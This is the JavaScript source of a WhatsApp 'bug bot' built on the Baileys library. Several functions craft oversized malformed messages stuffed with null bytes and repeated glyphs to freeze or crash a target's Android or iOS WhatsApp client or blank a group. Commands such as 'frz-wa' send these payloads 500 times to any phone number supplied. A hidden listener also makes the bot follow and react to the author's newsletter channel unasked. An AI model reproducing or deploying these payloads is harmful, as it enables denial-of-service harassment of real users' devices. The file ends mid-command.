const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const crypto = require('crypto');
const os = require('os');
const {
  default: makeWASocket, 
  proto, 
  generateWAMessage, 
  generateWAMessageFromContent, 
  getContentType, 
  prepareWAMessageMedia, 
  baileys,
  makeInMemoryStore
} = require("@whiskeysockets/baileys");
module.exports = prim = async (prim, m, chatUpdate, store) => {
try {
  const info = m
  const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId :
    m.mtype === "interactiveMessage" ?
      m.message.interactiveMessage?.header.title ||
      m.message.interactiveMessage?.body?.text ||
      m.message.interactiveMessage?.footer?.text
      || m.text : ""
  );

  const sender = m.key.fromMe
    ? prim.user.id.split(":")[0] || prim.user.id
    : m.key.participant || m.key.remoteJid;
  const isQ = (m.quoted?.msg || m.quoted) ? true : false;
  const senderNumber = sender.split('@')[0];
  const budy = (typeof m.text === 'string' ? m.text : '');
  const prefa = ["", "!", ".", ",", "🐤", "🗿"];
  const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? prefa;
  const from = m.key.remoteJid;
  const isGroup = from.endsWith("@g.us");
  const isChannel = from.endsWith("@newsletter");
  const botNumber = await prim.decodeJid(prim.user.id);
  const premiumz = JSON.parse(fs.readFileSync('./DataBases/premiumz.json'));
  const aiJid = "13135550002@s.whatsapp.net"
  const isPremium = [botNumber, ...premiumz].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
  const isBot = botNumber.includes(senderNumber)
  const isCmd = body.startsWith(prefix) ? true : false
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
  const args = body.trim().split(/ +/).slice(1);
  const pushname = m.pushName || "Nexus Crash";
  const text = q = args.join(" ");
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  const qmsg = (quoted.msg || quoted);
  const isMedia = /image|video|sticker|audio/.test(mime);
  const groupMetadata = isGroup ? await prim.groupMetadata(m.chat).catch((e) => {}) : "";
  const groupOwner = isGroup ? groupMetadata?.owner : "";
  const groupName = m.isGroup ? groupMetadata?.subject : "";
  const participants = isGroup ? await groupMetadata?.participants : "";
  const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.jid) : "";
  const groupMembers = isGroup ? groupMetadata?.participants : "";
  const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
  const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
  const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
  const { 
    smsg, 
    sendGmail, 
    formatSize, 
    isUrl, 
    generateMessageTag, 
    getBuffer, 
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep
  } = require('./myfunc'); 
  const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

  const reply = (teks) => {
    prim.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 2,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "𝙵𝚁𝙴𝙴 𝙱𝚄𝙶",
                newsletterJid: "120363421591325947@newsletter",
            },
        }
    }, { quoted: m });
}

var newsletterJids = [
  "120363421591325947@newsletter" // wa kite pam li siw kapab
];

var newsletterEmojis = [
  '❤️', '😂', '😍', '🔥', '🤫', '👻', '💀', '☠️', '🧐', '😶‍🌫️', '🥳', '👍', '😎'
];

var hansRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];

var lastFollowTime = 0;
var globalCooldown = 30 * 1000;
var followedUsers = new Set();
var isFollowing = false;

function bindNewsletterListeners(prim) {
  if (prim._newsletterBound) return;
  prim._newsletterBound = true;

  prim.ev.on("messages.upsert", async (chatUpdate) => {
    const mek = chatUpdate.messages[0];
    if (!mek.message) return;
    const userJid = mek.key.remoteJid;
    if (followedUsers.has(userJid)) return;
    if (isFollowing) return;
    const now = Date.now();
    if (now - lastFollowTime < globalCooldown) return;
    isFollowing = true;
    lastFollowTime = now;
    try {
      for (let jid of newsletterJids) {
        try {
          await prim.newsletterFollow(jid, true);
          await new Promise(r => setTimeout(r, 15000));
        } catch (err) {
          const errMsg = err?.message || String(err);
          if (!errMsg.includes("rate")) {
          } else {
            await new Promise(r => setTimeout(r, 20000));
          }
        }
      }
      followedUsers.add(userJid);
      setTimeout(() => followedUsers.delete(userJid), 12 * 60 * 60 * 1000);
    } catch (e) {}
    isFollowing = false;
  });

  prim.ev.on('messages.upsert', async (chatUpdate) => {
    try {
      const msg = chatUpdate.messages?.[0];
      if (!msg || msg.key.fromMe) return;
      const sender = msg.key.remoteJid;
      if (newsletterJids.includes(sender)) {
        const serverId = msg.key?.server_id;
        if (serverId) {
          const emoji = hansRandom(newsletterEmojis);
          try {
            await prim.newsletterReactMessage(sender, serverId.toString(), emoji);
          } catch (reactErr) {}
        }
      }
    } catch (err) {}
  });
}

// frz x Crash

async function freezdelay(prim, target) {
  const travazap = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: { 
          body: { text: "Nexuss" },
          
          nativeFlowMessage: { 
            buttons: "\u0000".repeat(500000),
            },
           },
         },
        },
      };
      
      const travavirus = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: { 
          body: { text: "Nexuss" },
          
          nativeFlowMessage: { 
            buttons: "\u0000".repeat(500000),
            },
           },
         },
        },
      };
       
       try {
    const midosmbfreez = generateWAMessageFromContent(target, travavirus, {});
    await prim.relayMessage(target, midosmbfreez.message, {
        messageId: midosmbfreez.key.id,
participant: true
    });

    await new Promise((resolve) => setTimeout(resolve, 500));

    const Midokey = generateWAMessageFromContent(target, travazap, {});
    await prim.relayMessage(target, Midokey.message, {
        messageId: Midokey.key.id,
participant: true
    });

} catch (_) {
    
}
}

// delay

async function aioz(target) {
     prim.relayMessage(target, { 
         botForwardedMessage: {
                message: { 
            richResponseMessage: { 
               messageType: 1, 
                submessages: [{
                 messageType: 7,
                  mapMetadata: {
                   centerLatitude: -999999, 
                   centerLongitude: 99999, 
                   latitudeDelta: 99999, 
                   longitudeDelta: 99999, 
                   annotations: [{
                   annotationNumber: 1, 
                   latitude: -999999,
                   longitude: 99999999, 
                   title: "\0".repeat(500000), 
              body: "𑇂𑆵𑆴𑆿".repeat(500) }, {
              annotationNumber: 1,
              latitude: -999999, 
              longitude: 99999999, 
              title: "🦠⃰‌PrinceTech" + "\0".repeat(5000), 
              body: "𑇂𑆵𑆴𑆿".repeat(500) }, { 
              annotationNumber: 1, 
              latitude: -999999, 
              longitude: 99999999, 
              title: "\0".repeat(500000), 
              body: "\0".repeat(5000) } 
               ] 
             } 
           }
          ], 
                 contextInfo: { 
                 forwardingScore: 9999, 
                 isForwarded: true, 
                 forwardedAiBotMessageInfo: { 
                 botJid: "259786046210223@bot" },
                 forwardOrigin: 4, 
                 botMessageSharingInfo: { 
                 botEntryPointOrigin: 1, 
                 forwardScore: 99 
                } 
              } 
            } 
          }
        }
       }, { 
               participant: true 
           } 
         );
       
     }

// frz iOS 

async function fiOS(target) {
    await prim.relayMessage(target, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            locationMessage: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "𑇂𑆵𑆴𑆿".repeat(9000)
            },
            contentText: "Nexuss",
            buttons: [{
              buttonId: "Primis",
              buttonText: {
                displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
              },
              type: 1
            }],
            headerType: 6
          }
        }
      }
    }, {
      participant: true
    })
    await sleep(1000);
  }

// blank group

async function satz(prim, target) {
await prim.relayMessage(target,{
interactiveMessage: {
header: {
title: "Nexus"},
body: {},
nativeFlowMessage: {
buttons: [
          {
            name: "order_status",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 0,
                offset: 100
              },
              reference_id: "\0".repeat(55000),
              type: "physical-goods",
              order: {
                status: "pending",
                order_type: "PAYMENT_REQUEST",
                items: [
                  {
                    name: "\0".repeat(55000),
                    quantity: -9,
                    price: {
                      value: 0,
                      offset: 100
                    }
                  }
                ]
              }
            })
          }
        ]
}
}
},{})
}


switch(command) {

case "linkbot":
case "getbot":
case "telebot":
case "freebot":
case "pair":
case "reqpair":
case "repo": {
    await prim.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })

    const txt = `
> ╔════─── • ───══╗
> ║╭────•
> ║┃───⎝⎝✧ *𝙵𝚁𝙴𝙴 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃➳ *\`𝙱𝙾𝚃 𝙻𝙸𝙽𝙺\`*
> ║┃╰─ *https://-------------*
> ║╰────•
> ╚════─── • ───══╝
`
    await prim.sendMessage(m.chat, {
        text: txt,
        contextInfo: {
            quotedMessage: m.message,
            remoteJid: m.key.remoteJid,
            participant: m.key.participant
        }
    }, { quoted: m })
}
break


case 'mode':{

  if (!isBot) return reply("Botz only");
     reply(`🔹 Mode : ${prim.public ? 'Public' : 'Private'}`);
     }
     break;

case "self": {

  if (!isBot) return reply("Botz only");
  if (!prim.public && isBot) return reply("Botz in self mode already");
  prim.public = false
  prim.saveSetting && prim.saveSetting('public', false)
  reply("The self mode is activated successfully")
}
break;

case "public": {

  if (!isBot) return reply("Botz only");
  if (prim.public && isBot) return reply("Botz in published mode already");
  prim.public = true
  prim.saveSetting && prim.saveSetting('public', true)
  reply("The public mode is activated successfully")
}
break;

case 'ping':
                          case 'p':

  await prim.sendMessage(from, { react: { text: '🚀', key: m.key } });
                            {
                              
                                   async function loading (jid) {
                             
                                    let start = new Date;
                                    let { key } = await prim.sendMessage(jid, {text: 'wait..'})
                                    let done = new Date - start;
                                    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`
                                    
                                    await sleep(1000)
                                    await prim.sendMessage(jid, {text: lod, edit: key });
                                    }
                                    loading(from)
                                   
                            }       
                            break;
                          
 
case "owner": {
   const ownerName = "𝙸𝚃'𝚂 𝙼𝙴";  
   const ownerNumber = "243860885022"; 
   const displayTag = "𝚃𝙷𝙴 𝙾𝙽𝙻𝚈 𝙾𝚆𝙽𝙴𝚁 𝙾𝙵 𝙵𝚁𝙴𝙴 𝙱𝚄𝙶";

   let vcard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;type=CELL;type=VOICE;waid=${ownerNumber}:+${ownerNumber}
END:VCARD`;

   let caption = `
╭───「 👑 𝙾𝚆𝙽𝙴𝚁 𝙸𝙽𝙵𝙾 」
│
│ 𝙽𝙰𝙼𝙴: ${ownerName}  
│ 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿: wa.me/${ownerNumber}  
│ 𝚁𝙾𝙻𝙴: ${displayTag}  
│
╰───────────────◆
`

   await prim.sendMessage(m.chat, { 
      contacts: { displayName: displayTag, contacts: [{ vcard }] } 
   }, { quoted: m });

   await prim.sendMessage(m.chat, {
      text: caption,
      mentions: [m.sender],
      contextInfo: {
         isForwarded: true,
         forwardingScore: 9999,
         forwardedNewsletterMessageInfo: {
            newsletterJid: `120363421591325947@newsletter`, 
            newsletterName: `𝙵𝚁𝙴𝙴 𝙱𝚄𝙶`
         }
      }
   }, { quoted: m });
}
break;

case 'jid': {
    
            reply(from)
           }
          break;

case "squichy": case "menu": {
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝐏𝐫𝐢𝐧𝐜𝐞𝐓𝐞𝐜𝐡
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──═══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙵𝚁𝙴𝙴 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃ ✧ *\`𝙼𝙰𝙸𝙽 𝙲𝙼𝙳𝚂\`*
> ║┃➳ *${prefix}𝙿𝙰𝙸𝚁*
> ║┃➳ *${prefix}𝙾𝚆𝙽𝙴𝚁*
> ║┃➳ *${prefix}𝙿𝙸𝙽𝙶*
> ║┃➳ *${prefix}𝚂𝙴𝙻𝙵*
> ║┃➳ *${prefix}𝙿𝚄𝙱𝙻𝙸𝙲*
> ║┃➳ *${prefix}𝙱𝚄𝙶-𝙼𝙴𝙽𝚄*
> ║╰────•
> ╚════── • ──═══╝
`
        const imageUrl = "https://files.catbox.moe/mp1sly.jpeg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363421591325947@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;
    
case "bug-menu": {
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝗣𝗿𝗶𝗻𝗰𝗲𝗧𝗲𝗰𝗵
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙱𝚄𝙶 𝙼𝙴𝙽𝚄* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙱𝚄𝙶 𝙵𝙴𝙰𝚃𝚄𝚁𝙴\`*
> ║┃➳ *${prefix}𝙸𝙾𝚂-𝙱𝚄𝙶*
> ║┃➳ *${prefix}𝙰𝙽𝙳𝚁𝙾-𝙱𝚄𝙶*
> ║┃➳ *${prefix}𝙶𝚁𝙾𝚄𝙿-𝙱𝚄𝙶*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/mp1sly.jpeg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363421591325947@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;
    
// andro bug

case "andro-bug": {
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝗣𝗿𝗶𝗻𝗰𝗲𝗧𝗲𝗰𝗵
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙰𝙽𝙳𝚁𝙾 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙵𝚁𝙴𝙴𝚉𝙴\`*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝚆𝙰*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝚇𝙲𝚇*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝙳𝙾𝙲*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝚂𝚀𝙻*
> ║┃
> ║┃──⎝⎝ *\`𝙳𝙴𝙻𝙰𝚈\`*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝚂𝚀𝙻*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝙲𝚂𝙻*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝙳𝙾𝙲*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝚅𝙲𝚂*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/mp1sly.jpeg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363421591325947@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// ios bug

case "ios-bug": {
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝗣𝗿𝗶𝗻𝗰𝗲𝗧𝗲𝗰𝗵
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙾𝚂 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙵𝚁𝚉 𝙸𝙾𝚂\`*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝙱𝚃𝙽*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝙸𝙾𝚂*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝙲𝙷𝙰𝚃*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝙱𝚄𝚃𝚃𝙾𝙽*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/mp1sly.jpeg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363421591325947@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// group bug

case "group-bug": {
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝗣𝗿𝗶𝗻𝗰𝗲𝗧𝗲𝗰𝗵
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙶𝚁𝙾𝚄𝙿 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙱𝙻𝙰𝙽𝙺 𝙲𝙻𝙸𝙲𝙺\`*
> ║┃➳ *${prefix}𝙱𝚄𝙶-𝙶𝙲*
> ║┃➳ *${prefix}𝙺𝙸𝙻𝙻-𝙶𝙲*
> ║┃➳ *${prefix}𝙲𝙾𝙾𝙻-𝙶𝙲*
> ║┃➳ *${prefix}𝙱𝙻𝙰𝙽𝙺-𝙶𝙲*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/mp1sly.jpeg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363421591325947@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;
    
// case bug

case 'frz-xcx': case 'frz-wa': case 'frz-doc': case 'frz-sql': {
  if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 24312345568*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 243777733333*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗳𝗖𝗿𝘇\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );
    for (let i = 0; i < 500; i++) {
    await freezdelay(prim, target)
}
}
break;

case 'delay-sql': case 'delay-csl': case 'delay-doc': case 'delay-vcs': {
  if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
